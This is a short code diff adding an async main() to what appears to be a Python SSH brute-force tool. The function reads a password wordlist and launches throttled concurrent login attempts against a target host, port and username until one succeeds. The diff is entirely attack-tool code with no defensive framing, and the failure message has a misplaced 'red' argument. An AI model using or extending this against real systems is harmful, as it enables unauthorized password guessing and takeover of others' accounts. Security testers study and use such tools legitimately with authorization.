@@ -21,6 +21,36 @@ def get_args():
 
     return args
 
+
+async def main(target, port, username, wordlist):
+    tasks = []
+    passwords = []
+    found_flag = asyncio.Event()
+    concurrency_limit = 10
+    counter = 0
+
+    with open(wordlist, 'r') as f:
+        for password in f.readlines():
+            password = password.strip()
+            passwords.append(password)
+
+    for password in passwords:
+        if counter >= concurrency_limit:
+            await asyncio.wait(tasks, return_when=asyncio.FIRST_COMPLETED)
+            tasks = []
+            counter = 0
+
+        if not found_flag.is_set():
+            tasks.append(asyncio.create_task(ssh_bruteforce(target, port, username, password, found_flag)))
+            await asyncio.sleep(0.5)
+            counter += 1
+
+    await asyncio.gather(*tasks)
+
+    if not found_flag.is_set():
+        print(colored("\n[-] Failed to find the correct password"), 'red')
+
+
 if __name__ == '__main__':
     args = get_args()
 
